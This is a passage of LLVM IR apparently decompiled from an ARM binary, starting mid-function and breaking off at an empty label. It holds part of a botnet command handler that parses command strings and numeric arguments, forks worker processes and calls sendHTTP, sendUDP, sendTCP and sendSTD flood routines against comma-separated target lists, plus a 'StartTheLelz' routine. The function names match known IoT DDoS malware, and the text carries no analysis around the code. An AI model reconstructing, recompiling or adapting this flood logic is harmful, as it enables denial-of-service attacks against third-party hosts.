dec_label_pc_d6cc:                                ; preds = %dec_label_pc_d678, %dec_label_pc_d6ac
  %v2_d6d4 = load i32, i32* %v1_d680, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1c330.226 to i32), i32* @r1, align 4
  %v3_d6e0 = inttoptr i32 %v2_d6d4 to i8*
  %v4_d6e0 = call i32 @__GI_strcoll(i8* %v3_d6e0, i32 ptrtoint ([3 x i8]* @global_var_1c330.226 to i32))
  store i32 %v4_d6e0, i32* @r0, align 4
  %v2_d6e8 = icmp eq i32 %v4_d6e0, 0
  br i1 %v2_d6e8, label %dec_label_pc_d6f0, label %dec_label_pc_d758

dec_label_pc_d6f0:                                ; preds = %dec_label_pc_d6cc
  %v2_d6f4 = load i32, i32* @global_var_2c704.224, align 4
  %v2_d6f8 = icmp eq i32 %v2_d6f4, 0
  br i1 %v2_d6f8, label %dec_label_pc_d700, label %dec_label_pc_e1a0

dec_label_pc_d700:                                ; preds = %dec_label_pc_d6f0
  %v0_d700 = call i32 @__libc_fork()
  %v2_d720 = icmp eq i32 %v0_d700, 0
  br i1 %v2_d720, label %dec_label_pc_d744, label %dec_label_pc_d728

dec_label_pc_d728:                                ; preds = %dec_label_pc_d700
  store i32 %v0_d700, i32* @global_var_2c704.224, align 4
  br label %dec_label_pc_e1a0

dec_label_pc_d744:                                ; preds = %dec_label_pc_d700
  %v2_d74c = call i32 @StartTheLelz(i32 10, i32 1000)
  %v1_d754 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_d758

dec_label_pc_d758:                                ; preds = %dec_label_pc_d6cc, %dec_label_pc_d658, %dec_label_pc_d744
  %v2_d75c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1c334.228 to i32), i32* @r1, align 4
  %v3_d768 = inttoptr i32 %v2_d75c to i8*
  %v4_d768 = call i32 @__GI_strcoll(i8* %v3_d768, i32 ptrtoint ([5 x i8]* @global_var_1c334.228 to i32))
  %v2_d770 = icmp eq i32 %v4_d768, 0
  br i1 %v2_d770, label %dec_label_pc_d778, label %dec_label_pc_d8e8

dec_label_pc_d778:                                ; preds = %dec_label_pc_d758
  %v7_d780 = icmp slt i32 %arg1, 6
  br i1 %v7_d780, label %dec_label_pc_e1a0, label %dec_label_pc_d784

dec_label_pc_d784:                                ; preds = %dec_label_pc_d778
  %v1_d788 = add i32 %tmp, 12
  %v1_d78c = inttoptr i32 %v1_d788 to i32*
  %v2_d78c = load i32, i32* %v1_d78c, align 4
  store i32 %v2_d78c, i32* @r0, align 4
  %v1_d794 = call i32 @atol(i32 %v2_d78c)
  %tmp81 = icmp slt i32 %v1_d794, 1
  br i1 %tmp81, label %dec_label_pc_e1a0, label %dec_label_pc_d7a4

dec_label_pc_d7a4:                                ; preds = %dec_label_pc_d784
  %v1_d7a8 = add i32 %tmp, 20
  %v1_d7ac = inttoptr i32 %v1_d7a8 to i32*
  %v2_d7ac = load i32, i32* %v1_d7ac, align 4
  store i32 %v2_d7ac, i32* @r0, align 4
  %v1_d7b4 = call i32 @atol(i32 %v2_d7ac)
  store i32 %v1_d7b4, i32* @r0, align 4
  %v5_d7c0 = icmp sgt i32 %v1_d7b4, 0
  br i1 %v5_d7c0, label %dec_label_pc_d7c8, label %dec_label_pc_e1a0

dec_label_pc_d7c8:                                ; preds = %dec_label_pc_d7a4
  %v0_d7c8 = call i32 @listFork()
  %v2_d7d0 = icmp eq i32 %v0_d7c8, 0
  br i1 %v2_d7d0, label %dec_label_pc_d7d8, label %dec_label_pc_e1a0

dec_label_pc_d7d8:                                ; preds = %dec_label_pc_d7c8
  %v2_d7dc = load i32, i32* @global_var_26498.45, align 4
  store i32 %v2_d7dc, i32* @r5, align 4
  %v1_d7e4 = add i32 %tmp, 4
  %v1_d7e8 = inttoptr i32 %v1_d7e4 to i32*
  %v2_d7e8 = load i32, i32* %v1_d7e8, align 4
  store i32 %v2_d7e8, i32* @r6, align 4
  %v1_d7f0 = add i32 %tmp, 8
  %v1_d7f4 = inttoptr i32 %v1_d7f0 to i32*
  %v2_d7f4 = load i32, i32* %v1_d7f4, align 4
  store i32 %v2_d7f4, i32* @r7, align 4
  %v2_d800 = load i32, i32* %v1_d78c, align 4
  store i32 %v2_d800, i32* @r0, align 4
  %v1_d808 = call i32 @atol(i32 %v2_d800)
  store i32 %v1_d808, i32* @r4, align 4
  %v2_d818 = load i32, i32* %v1_d7ac, align 4
  store i32 %v2_d818, i32* @r0, align 4
  %v1_d820 = call i32 @atol(i32 %v2_d818)
  %v0_d830 = load i32, i32* @r5, align 4
  %v0_d838 = load i32, i32* @r6, align 4
  %v0_d83c = load i32, i32* @r7, align 4
  %v7_d840 = call i32 @Rootsprintf(i32 %v0_d830, i32 ptrtoint ([38 x i8]* @global_var_1c33c.231 to i32), i32 %v0_d838, i32 %v0_d83c)
  %v2_d84c = load i32, i32* %v1_d7e8, align 4
  store i32 %v2_d84c, i32* @r5, align 4
  %v2_d85c = load i32, i32* %v1_d7f4, align 4
  store i32 %v2_d85c, i32* @r6, align 4
  %v2_d86c = load i32, i32* %v1_d78c, align 4
  store i32 %v2_d86c, i32* @r0, align 4
  %v1_d874 = call i32 @atol(i32 %v2_d86c)
  %v3_d880 = urem i32 %v1_d874, 65536
  store i32 %v3_d880, i32* @r7, align 4
  %v1_d888 = add i32 %tmp, 16
  %v1_d88c = inttoptr i32 %v1_d888 to i32*
  %v2_d88c = load i32, i32* %v1_d88c, align 4
  store i32 %v2_d88c, i32* @r8, align 4
  %v2_d89c = load i32, i32* %v1_d7ac, align 4
  store i32 %v2_d89c, i32* @r0, align 4
  %v1_d8a4 = call i32 @atol(i32 %v2_d89c)
  store i32 %v1_d8a4, i32* @r4, align 4
  %v1_d8b0 = add i32 %tmp, 24
  %v1_d8b4 = inttoptr i32 %v1_d8b0 to i32*
  %v2_d8b4 = load i32, i32* %v1_d8b4, align 4
  store i32 %v2_d8b4, i32* @r0, align 4
  %v1_d8bc = call i32 @atol(i32 %v2_d8b4)
  %v0_d8c4 = load i32, i32* @r4, align 4
  %v0_d8cc = load i32, i32* @r5, align 4
  %v0_d8d0 = load i32, i32* @r6, align 4
  %v0_d8d4 = load i32, i32* @r7, align 4
  %v0_d8d8 = load i32, i32* @r8, align 4
  %v6_d8dc = trunc i32 %v0_d8d4 to i16
  %v7_d8dc = call i32 @sendHTTP(i32 %v0_d8cc, i32 %v0_d8d0, i16 %v6_d8dc, i32 %v0_d8d8, i32 %v0_d8c4, i32 %v1_d8bc)
  %v1_d8e4 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_d8e8

dec_label_pc_d8e8:                                ; preds = %dec_label_pc_d758, %dec_label_pc_d7d8
  %v2_d8ec = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1c364.233 to i32), i32* @r1, align 4
  %v3_d8f8 = inttoptr i32 %v2_d8ec to i8*
  %v4_d8f8 = call i32 @__GI_strcoll(i8* %v3_d8f8, i32 ptrtoint ([4 x i8]* @global_var_1c364.233 to i32))
  %v2_d900 = icmp eq i32 %v4_d8f8, 0
  br i1 %v2_d900, label %dec_label_pc_d908, label %dec_label_pc_dc54

dec_label_pc_d908:                                ; preds = %dec_label_pc_d8e8
  %v7_d910 = icmp slt i32 %arg1, 6
  br i1 %v7_d910, label %dec_label_pc_e1a0, label %dec_label_pc_d914

dec_label_pc_d914:                                ; preds = %dec_label_pc_d908
  %v1_d918 = add i32 %tmp, 12
  %v1_d91c = inttoptr i32 %v1_d918 to i32*
  %v2_d91c = load i32, i32* %v1_d91c, align 4
  store i32 %v2_d91c, i32* @r0, align 4
  %v1_d924 = call i32 @atol(i32 %v2_d91c)
  %v7_d92c = icmp eq i32 %v1_d924, -1
  br i1 %v7_d92c, label %dec_label_pc_e1a0, label %dec_label_pc_d934

dec_label_pc_d934:                                ; preds = %dec_label_pc_d914
  %v1_d938 = add i32 %tmp, 8
  %v1_d93c = inttoptr i32 %v1_d938 to i32*
  %v2_d93c = load i32, i32* %v1_d93c, align 4
  store i32 %v2_d93c, i32* @r0, align 4
  %v1_d944 = call i32 @atol(i32 %v2_d93c)
  %v7_d94c = icmp eq i32 %v1_d944, -1
  br i1 %v7_d94c, label %dec_label_pc_e1a0, label %dec_label_pc_d954

dec_label_pc_d954:                                ; preds = %dec_label_pc_d934
  %v1_d958 = add i32 %tmp, 16
  %v1_d95c = inttoptr i32 %v1_d958 to i32*
  %v2_d95c = load i32, i32* %v1_d95c, align 4
  store i32 %v2_d95c, i32* @r0, align 4
  %v1_d964 = call i32 @atol(i32 %v2_d95c)
  %v7_d96c = icmp eq i32 %v1_d964, -1
  br i1 %v7_d96c, label %dec_label_pc_e1a0, label %dec_label_pc_d974

dec_label_pc_d974:                                ; preds = %dec_label_pc_d954
  %v1_d978 = add i32 %tmp, 20
  %v1_d97c = inttoptr i32 %v1_d978 to i32*
  %v2_d97c = load i32, i32* %v1_d97c, align 4
  store i32 %v2_d97c, i32* @r0, align 4
  %v1_d984 = call i32 @atol(i32 %v2_d97c)
  %v7_d98c = icmp eq i32 %v1_d984, -1
  br i1 %v7_d98c, label %dec_label_pc_e1a0, label %dec_label_pc_d994

dec_label_pc_d994:                                ; preds = %dec_label_pc_d974
  %v2_d99c = load i32, i32* %v1_d97c, align 4
  store i32 %v2_d99c, i32* @r0, align 4
  %v1_d9a4 = call i32 @atol(i32 %v2_d99c)
  %v8_d9b0 = icmp sgt i32 %v1_d9a4, 65536
  br i1 %v8_d9b0, label %dec_label_pc_e1a0, label %dec_label_pc_d9b4

dec_label_pc_d9b4:                                ; preds = %dec_label_pc_d994
  %v2_d9bc = load i32, i32* %v1_d97c, align 4
  store i32 %v2_d9bc, i32* @r0, align 4
  %v1_d9c4 = call i32 @atol(i32 %v2_d9bc)
  %v8_d9d8 = icmp sgt i32 %v1_d9c4, ptrtoint (i32* @global_var_ffdc.234 to i32)
  br i1 %v8_d9d8, label %dec_label_pc_e1a0, label %dec_label_pc_d9dc

dec_label_pc_d9dc:                                ; preds = %dec_label_pc_d9b4
  %v2_d9e4 = load i32, i32* %v1_d95c, align 4
  store i32 %v2_d9e4, i32* @r0, align 4
  %v1_d9ec = call i32 @atol(i32 %v2_d9e4)
  %v8_d9f8 = icmp sgt i32 %v1_d9ec, 32
  br i1 %v8_d9f8, label %dec_label_pc_e1a0, label %dec_label_pc_d9fc

dec_label_pc_d9fc:                                ; preds = %dec_label_pc_d9dc
  %v7_da00 = icmp eq i32 %arg1, 7
  br i1 %v7_da00, label %dec_label_pc_da08, label %dec_label_pc_da2c

dec_label_pc_da08:                                ; preds = %dec_label_pc_d9fc
  %v1_da0c = add i32 %tmp, 24
  %v1_da10 = inttoptr i32 %v1_da0c to i32*
  %v2_da10 = load i32, i32* %v1_da10, align 4
  store i32 %v2_da10, i32* @r0, align 4
  %v1_da18 = call i32 @atol(i32 %v2_da10)
  %v5_da24 = icmp sgt i32 %v1_da18, 0
  br i1 %v5_da24, label %dec_label_pc_da2c, label %dec_label_pc_e1a0

dec_label_pc_da2c:                                ; preds = %dec_label_pc_d9fc, %dec_label_pc_da08
  %v1_da30 = add i32 %tmp, 4
  %v1_da34 = inttoptr i32 %v1_da30 to i32*
  %v2_da34 = load i32, i32* %v1_da34, align 4
  %v2_da44 = load i32, i32* %v1_d93c, align 4
  store i32 %v2_da44, i32* @r0, align 4
  %v1_da4c = call i32 @atol(i32 %v2_da44)
  %v2_da60 = load i32, i32* %v1_d91c, align 4
  store i32 %v2_da60, i32* @r0, align 4
  %v1_da68 = call i32 @atol(i32 %v2_da60)
  %v2_da7c = load i32, i32* %v1_d95c, align 4
  store i32 %v2_da7c, i32* @r0, align 4
  %v1_da84 = call i32 @atol(i32 %v2_da7c)
  %v2_da98 = load i32, i32* %v1_d97c, align 4
  store i32 %v2_da98, i32* @r0, align 4
  %v1_daa0 = call i32 @atol(i32 %v2_da98)
  %v7_dab4 = icmp slt i32 %arg1, 7
  br i1 %v7_dab4, label %dec_label_pc_dad4, label %dec_label_pc_dab8

dec_label_pc_dab8:                                ; preds = %dec_label_pc_da2c
  %v1_dabc = add i32 %tmp, 24
  %v1_dac0 = inttoptr i32 %v1_dabc to i32*
  %v2_dac0 = load i32, i32* %v1_dac0, align 4
  store i32 %v2_dac0, i32* @r0, align 4
  %v1_dac8 = call i32 @atol(i32 %v2_dac0)
  br label %dec_label_pc_dadc

dec_label_pc_dad4:                                ; preds = %dec_label_pc_da2c
  br label %dec_label_pc_dadc

dec_label_pc_dadc:                                ; preds = %dec_label_pc_dab8, %dec_label_pc_dad4
  %storemerge8 = phi i32 [ 1000, %dec_label_pc_dad4 ], [ %v1_dac8, %dec_label_pc_dab8 ]
  %v7_daec = icmp slt i32 %arg1, 8
  br i1 %v7_daec, label %dec_label_pc_db0c, label %dec_label_pc_daf0

dec_label_pc_daf0:                                ; preds = %dec_label_pc_dadc
  %v1_daf4 = add i32 %tmp, 28
  %v1_daf8 = inttoptr i32 %v1_daf4 to i32*
  %v2_daf8 = load i32, i32* %v1_daf8, align 4
  store i32 %v2_daf8, i32* @r0, align 4
  %v1_db00 = call i32 @atol(i32 %v2_daf8)
  br label %dec_label_pc_db20

dec_label_pc_db0c:                                ; preds = %dec_label_pc_dadc
  br label %dec_label_pc_db20

dec_label_pc_db20:                                ; preds = %dec_label_pc_daf0, %dec_label_pc_db0c
  %storemerge7 = phi i32 [ 1000000, %dec_label_pc_db0c ], [ %v1_db00, %dec_label_pc_daf0 ]
  %v7_db30 = icmp slt i32 %arg1, 9
  br i1 %v7_db30, label %dec_label_pc_db50, label %dec_label_pc_db34

dec_label_pc_db34:                                ; preds = %dec_label_pc_db20
  %v1_db38 = add i32 %tmp, 32
  %v1_db3c = inttoptr i32 %v1_db38 to i32*
  %v2_db3c = load i32, i32* %v1_db3c, align 4
  store i32 %v2_db3c, i32* @r0, align 4
  %v1_db44 = call i32 @atol(i32 %v2_db3c)
  br label %dec_label_pc_db58

dec_label_pc_db50:                                ; preds = %dec_label_pc_db20
  br label %dec_label_pc_db58

dec_label_pc_db58:                                ; preds = %dec_label_pc_db34, %dec_label_pc_db50
  %storemerge6 = phi i32 [ 0, %dec_label_pc_db50 ], [ %v1_db44, %dec_label_pc_db34 ]
  store i32 %v2_da34, i32* @r0, align 4
  %v2_db6c = call i32 @__GI_strchr(i32 %v2_da34, i32 44)
  store i32 %v2_db6c, i32* @r0, align 4
  %v2_db74 = icmp eq i32 %v2_db6c, 0
  br i1 %v2_db74, label %dec_label_pc_dc08, label %dec_label_pc_db7c

dec_label_pc_db7c:                                ; preds = %dec_label_pc_db58
  %v2_db88 = call i32 @__GI_strtok(i32 %v2_da34, i32 ptrtoint (i32* @global_var_1c304.206 to i32))
  store i32 %v2_db88, i32* @r0, align 4
  %v2_dbfc24 = icmp eq i32 %v2_db88, 0
  br i1 %v2_dbfc24, label %dec_label_pc_e1a0, label %dec_label_pc_db98

dec_label_pc_db98:                                ; preds = %dec_label_pc_db7c, %dec_label_pc_dbe4
  %storemerge1525 = phi i32 [ %v2_dbec, %dec_label_pc_dbe4 ], [ %v2_db88, %dec_label_pc_db7c ]
  %v0_db98 = call i32 @listFork()
  %v2_dba0 = icmp eq i32 %v0_db98, 0
  br i1 %v2_dba0, label %dec_label_pc_dba8, label %dec_label_pc_dbe4

dec_label_pc_dba8:                                ; preds = %dec_label_pc_db98
  %v8_dbd8 = call i32 @sendUDP(i32 %storemerge1525, i32 %v1_da4c, i32 %v1_da68, i32 %v1_da84, i32 %v1_daa0, i32 %storemerge8, i32 %storemerge7, i32 %storemerge6)
  %v1_dbe0 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_dbe4

dec_label_pc_dbe4:                                ; preds = %dec_label_pc_db98, %dec_label_pc_dba8
  %v2_dbec = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1c304.206 to i32))
  store i32 %v2_dbec, i32* @r0, align 4
  %v2_dbfc = icmp eq i32 %v2_dbec, 0
  br i1 %v2_dbfc, label %dec_label_pc_e1a0, label %dec_label_pc_db98

dec_label_pc_dc08:                                ; preds = %dec_label_pc_db58
  %v0_dc08 = call i32 @listFork()
  %v2_dc10 = icmp eq i32 %v0_dc08, 0
  br i1 %v2_dc10, label %dec_label_pc_dc18, label %dec_label_pc_e1a0

dec_label_pc_dc18:                                ; preds = %dec_label_pc_dc08
  %v8_dc48 = call i32 @sendUDP(i32 %v2_da34, i32 %v1_da4c, i32 %v1_da68, i32 %v1_da84, i32 %v1_daa0, i32 %storemerge8, i32 %storemerge7, i32 %storemerge6)
  %v1_dc50 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_dc54

dec_label_pc_dc54:                                ; preds = %dec_label_pc_d8e8, %dec_label_pc_dc18
  %v2_dc58 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1c368.237 to i32), i32* @r1, align 4
  %v3_dc64 = inttoptr i32 %v2_dc58 to i8*
  %v4_dc64 = call i32 @__GI_strcoll(i8* %v3_dc64, i32 ptrtoint ([4 x i8]* @global_var_1c368.237 to i32))
  %v2_dc6c = icmp eq i32 %v4_dc64, 0
  br i1 %v2_dc6c, label %dec_label_pc_dc74, label %dec_label_pc_df24

dec_label_pc_dc74:                                ; preds = %dec_label_pc_dc54
  %v7_dc7c = icmp slt i32 %arg1, 6
  br i1 %v7_dc7c, label %dec_label_pc_e1a0, label %dec_label_pc_dc80

dec_label_pc_dc80:                                ; preds = %dec_label_pc_dc74
  %v1_dc84 = add i32 %tmp, 12
  %v1_dc88 = inttoptr i32 %v1_dc84 to i32*
  %v2_dc88 = load i32, i32* %v1_dc88, align 4
  store i32 %v2_dc88, i32* @r0, align 4
  %v1_dc90 = call i32 @atol(i32 %v2_dc88)
  %v7_dc98 = icmp eq i32 %v1_dc90, -1
  br i1 %v7_dc98, label %dec_label_pc_e1a0, label %dec_label_pc_dca0

dec_label_pc_dca0:                                ; preds = %dec_label_pc_dc80
  %v1_dca4 = add i32 %tmp, 8
  %v1_dca8 = inttoptr i32 %v1_dca4 to i32*
  %v2_dca8 = load i32, i32* %v1_dca8, align 4
  store i32 %v2_dca8, i32* @r0, align 4
  %v1_dcb0 = call i32 @atol(i32 %v2_dca8)
  %v7_dcb8 = icmp eq i32 %v1_dcb0, -1
  br i1 %v7_dcb8, label %dec_label_pc_e1a0, label %dec_label_pc_dcc0

dec_label_pc_dcc0:                                ; preds = %dec_label_pc_dca0
  %v1_dcc4 = add i32 %tmp, 16
  %v1_dcc8 = inttoptr i32 %v1_dcc4 to i32*
  %v2_dcc8 = load i32, i32* %v1_dcc8, align 4
  store i32 %v2_dcc8, i32* @r0, align 4
  %v1_dcd0 = call i32 @atol(i32 %v2_dcc8)
  %v7_dcd8 = icmp eq i32 %v1_dcd0, -1
  br i1 %v7_dcd8, label %dec_label_pc_e1a0, label %dec_label_pc_dce0

dec_label_pc_dce0:                                ; preds = %dec_label_pc_dcc0
  %v2_dce8 = load i32, i32* %v1_dcc8, align 4
  store i32 %v2_dce8, i32* @r0, align 4
  %v1_dcf0 = call i32 @atol(i32 %v2_dce8)
  %v8_dcfc = icmp sgt i32 %v1_dcf0, 32
  br i1 %v8_dcfc, label %dec_label_pc_e1a0, label %dec_label_pc_dd00

dec_label_pc_dd00:                                ; preds = %dec_label_pc_dce0
  %v7_dd08 = icmp slt i32 %arg1, 7
  br i1 %v7_dd08, label %dec_label_pc_dd2c, label %dec_label_pc_dd0c

dec_label_pc_dd0c:                                ; preds = %dec_label_pc_dd00
  %v1_dd10 = add i32 %tmp, 24
  %v1_dd14 = inttoptr i32 %v1_dd10 to i32*
  %v2_dd14 = load i32, i32* %v1_dd14, align 4
  store i32 %v2_dd14, i32* @r0, align 4
  %v1_dd1c = call i32 @atol(i32 %v2_dd14)
  %v1_dd24 = icmp slt i32 %v1_dd1c, 0
  br i1 %v1_dd24, label %dec_label_pc_e1a0, label %dec_label_pc_dd2c

dec_label_pc_dd2c:                                ; preds = %dec_label_pc_dd0c, %dec_label_pc_dd00
  %v7_dd30 = icmp eq i32 %arg1, 8
  br i1 %v7_dd30, label %dec_label_pc_dd38, label %dec_label_pc_dd5c

dec_label_pc_dd38:                                ; preds = %dec_label_pc_dd2c
  %v1_dd3c = add i32 %tmp, 28
  %v1_dd40 = inttoptr i32 %v1_dd3c to i32*
  %v2_dd40 = load i32, i32* %v1_dd40, align 4
  store i32 %v2_dd40, i32* @r0, align 4
  %v1_dd48 = call i32 @atol(i32 %v2_dd40)
  %v5_dd54 = icmp sgt i32 %v1_dd48, 0
  br i1 %v5_dd54, label %dec_label_pc_dd5c, label %dec_label_pc_e1a0

dec_label_pc_dd5c:                                ; preds = %dec_label_pc_dd2c, %dec_label_pc_dd38
  %v1_dd60 = add i32 %tmp, 4
  %v1_dd64 = inttoptr i32 %v1_dd60 to i32*
  %v2_dd64 = load i32, i32* %v1_dd64, align 4
  %v2_dd74 = load i32, i32* %v1_dca8, align 4
  store i32 %v2_dd74, i32* @r0, align 4
  %v1_dd7c = call i32 @atol(i32 %v2_dd74)
  %v2_dd90 = load i32, i32* %v1_dc88, align 4
  store i32 %v2_dd90, i32* @r0, align 4
  %v1_dd98 = call i32 @atol(i32 %v2_dd90)
  %v2_ddac = load i32, i32* %v1_dcc8, align 4
  store i32 %v2_ddac, i32* @r0, align 4
  %v1_ddb4 = call i32 @atol(i32 %v2_ddac)
  %v1_ddc4 = add i32 %tmp, 20
  %v1_ddc8 = inttoptr i32 %v1_ddc4 to i32*
  %v2_ddc8 = load i32, i32* %v1_ddc8, align 4
  br i1 %v7_dd30, label %dec_label_pc_dddc, label %dec_label_pc_ddf8

dec_label_pc_dddc:                                ; preds = %dec_label_pc_dd5c
  %v1_dde0 = add i32 %tmp, 28
  %v1_dde4 = inttoptr i32 %v1_dde0 to i32*
  %v2_dde4 = load i32, i32* %v1_dde4, align 4
  store i32 %v2_dde4, i32* @r0, align 4
  %v1_ddec = call i32 @atol(i32 %v2_dde4)
  br label %dec_label_pc_de00

dec_label_pc_ddf8:                                ; preds = %dec_label_pc_dd5c
  br label %dec_label_pc_de00

dec_label_pc_de00:                                ; preds = %dec_label_pc_dddc, %dec_label_pc_ddf8
  %storemerge5 = phi i32 [ 10, %dec_label_pc_ddf8 ], [ %v1_ddec, %dec_label_pc_dddc ]
  br i1 %v7_dd08, label %dec_label_pc_de30, label %dec_label_pc_de14

dec_label_pc_de14:                                ; preds = %dec_label_pc_de00
  %v1_de18 = add i32 %tmp, 24
  %v1_de1c = inttoptr i32 %v1_de18 to i32*
  %v2_de1c = load i32, i32* %v1_de1c, align 4
  store i32 %v2_de1c, i32* @r0, align 4
  %v1_de24 = call i32 @atol(i32 %v2_de1c)
  br label %dec_label_pc_de38

dec_label_pc_de30:                                ; preds = %dec_label_pc_de00
  br label %dec_label_pc_de38

dec_label_pc_de38:                                ; preds = %dec_label_pc_de14, %dec_label_pc_de30
  %storemerge4 = phi i32 [ 0, %dec_label_pc_de30 ], [ %v1_de24, %dec_label_pc_de14 ]
  store i32 %v2_dd64, i32* @r0, align 4
  %v2_de4c = call i32 @__GI_strchr(i32 %v2_dd64, i32 44)
  store i32 %v2_de4c, i32* @r0, align 4
  %v2_de54 = icmp eq i32 %v2_de4c, 0
  br i1 %v2_de54, label %dec_label_pc_dee0, label %dec_label_pc_de5c

dec_label_pc_de5c:                                ; preds = %dec_label_pc_de38
  %v2_de68 = call i32 @__GI_strtok(i32 %v2_dd64, i32 ptrtoint (i32* @global_var_1c304.206 to i32))
  store i32 %v2_de68, i32* @r0, align 4
  %v2_ded421 = icmp eq i32 %v2_de68, 0
  br i1 %v2_ded421, label %dec_label_pc_df24, label %dec_label_pc_de78

dec_label_pc_de78:                                ; preds = %dec_label_pc_de5c, %dec_label_pc_debc
  %storemerge1322 = phi i32 [ %v2_dec4, %dec_label_pc_debc ], [ %v2_de68, %dec_label_pc_de5c ]
  %v0_de78 = call i32 @listFork()
  %v2_de80 = icmp eq i32 %v0_de78, 0
  br i1 %v2_de80, label %dec_label_pc_de88, label %dec_label_pc_debc

dec_label_pc_de88:                                ; preds = %dec_label_pc_de78
  %v7_deb0 = call i32 @sendTCP(i32 %storemerge1322, i32 %v1_dd7c, i32 %v1_dd98, i32 %v1_ddb4, i32 %v2_ddc8, i32 %storemerge4, i32 %storemerge5)
  %v1_deb8 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_debc

dec_label_pc_debc:                                ; preds = %dec_label_pc_de78, %dec_label_pc_de88
  %v2_dec4 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1c304.206 to i32))
  store i32 %v2_dec4, i32* @r0, align 4
  %v2_ded4 = icmp eq i32 %v2_dec4, 0
  br i1 %v2_ded4, label %dec_label_pc_df24, label %dec_label_pc_de78

dec_label_pc_dee0:                                ; preds = %dec_label_pc_de38
  %v0_dee0 = call i32 @listFork()
  %v2_dee8 = icmp eq i32 %v0_dee0, 0
  br i1 %v2_dee8, label %dec_label_pc_def0, label %dec_label_pc_df24

dec_label_pc_def0:                                ; preds = %dec_label_pc_dee0
  %v7_df18 = call i32 @sendTCP(i32 %v2_dd64, i32 %v1_dd7c, i32 %v1_dd98, i32 %v1_ddb4, i32 %v2_ddc8, i32 %storemerge4, i32 %storemerge5)
  %v1_df20 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_df24

dec_label_pc_df24:                                ; preds = %dec_label_pc_debc, %dec_label_pc_de5c, %dec_label_pc_dee0, %dec_label_pc_dc54, %dec_label_pc_def0
  %v2_df28 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1c36c.239 to i32), i32* @r1, align 4
  %v3_df34 = inttoptr i32 %v2_df28 to i8*
  %v4_df34 = call i32 @__GI_strcoll(i8* %v3_df34, i32 ptrtoint ([4 x i8]* @global_var_1c36c.239 to i32))
  %v2_df3c = icmp eq i32 %v4_df34, 0
  br i1 %v2_df3c, label %dec_label_pc_df44, label %dec_label_pc_e088

dec_label_pc_df44:                                ; preds = %dec_label_pc_df24
  %v7_df4c = icmp slt i32 %arg1, 4
  br i1 %v7_df4c, label %dec_label_pc_e1a0, label %dec_label_pc_df50

dec_label_pc_df50:                                ; preds = %dec_label_pc_df44
  %v1_df54 = add i32 %tmp, 8
  %v1_df58 = inttoptr i32 %v1_df54 to i32*
  %v2_df58 = load i32, i32* %v1_df58, align 4
  store i32 %v2_df58, i32* @r0, align 4
  %v1_df60 = call i32 @atol(i32 %v2_df58)
  %tmp82 = icmp slt i32 %v1_df60, 1
  br i1 %tmp82, label %dec_label_pc_e1a0, label %dec_label_pc_df70

dec_label_pc_df70:                                ; preds = %dec_label_pc_df50
  %v1_df74 = add i32 %tmp, 12
  %v1_df78 = inttoptr i32 %v1_df74 to i32*
  %v2_df78 = load i32, i32* %v1_df78, align 4
  store i32 %v2_df78, i32* @r0, align 4
  %v1_df80 = call i32 @atol(i32 %v2_df78)
  %v5_df8c = icmp sgt i32 %v1_df80, 0
  br i1 %v5_df8c, label %dec_label_pc_df94, label %dec_label_pc_e1a0

dec_label_pc_df94:                                ; preds = %dec_label_pc_df70
  %v1_df98 = add i32 %tmp, 4
  %v1_df9c = inttoptr i32 %v1_df98 to i32*
  %v2_df9c = load i32, i32* %v1_df9c, align 4
  %v2_dfac = load i32, i32* %v1_df58, align 4
  store i32 %v2_dfac, i32* @r0, align 4
  %v1_dfb4 = call i32 @atol(i32 %v2_dfac)
  %v2_dfc8 = load i32, i32* %v1_df78, align 4
  store i32 %v2_dfc8, i32* @r0, align 4
  %v1_dfd0 = call i32 @atol(i32 %v2_dfc8)
  store i32 %v2_df9c, i32* @r0, align 4
  %v2_dfe8 = call i32 @__GI_strchr(i32 %v2_df9c, i32 44)
  store i32 %v2_dfe8, i32* @r0, align 4
  %v2_dff0 = icmp eq i32 %v2_dfe8, 0
  br i1 %v2_dff0, label %dec_label_pc_e060, label %dec_label_pc_dff8

dec_label_pc_dff8:                                ; preds = %dec_label_pc_df94
  %v2_e004 = call i32 @__GI_strtok(i32 %v2_df9c, i32 ptrtoint (i32* @global_var_1c304.206 to i32))
  store i32 %v2_e004, i32* @r0, align 4
  %v2_e05418 = icmp eq i32 %v2_e004, 0
  br i1 %v2_e05418, label %dec_label_pc_e088, label %dec_label_pc_e014

dec_label_pc_e014:                                ; preds = %dec_label_pc_dff8, %dec_label_pc_e03c
  %storemerge1119 = phi i32 [ %v2_e044, %dec_label_pc_e03c ], [ %v2_e004, %dec_label_pc_dff8 ]
  %v0_e014 = call i32 @listFork()
  %v2_e01c = icmp eq i32 %v0_e014, 0
  br i1 %v2_e01c, label %dec_label_pc_e024, label %dec_label_pc_e03c

dec_label_pc_e024:                                ; preds = %dec_label_pc_e014
  %v4_e030 = call i32 @sendSTD(i32 %storemerge1119, i32 %v1_dfb4, i32 %v1_dfd0, i32 0)
  %v1_e038 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_e03c

dec_label_pc_e03c:                                ; preds = %dec_label_pc_e014, %dec_label_pc_e024
  %v2_e044 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1c304.206 to i32))
  store i32 %v2_e044, i32* @r0, align 4
  %v2_e054 = icmp eq i32 %v2_e044, 0
  br i1 %v2_e054, label %dec_label_pc_e088, label %dec_label_pc_e014

dec_label_pc_e060:                                ; preds = %dec_label_pc_df94
  %v0_e060 = call i32 @listFork()
  %v2_e068 = icmp eq i32 %v0_e060, 0
  br i1 %v2_e068, label %dec_label_pc_e070, label %dec_label_pc_e1a0

dec_label_pc_e070:                                ; preds = %dec_label_pc_e060
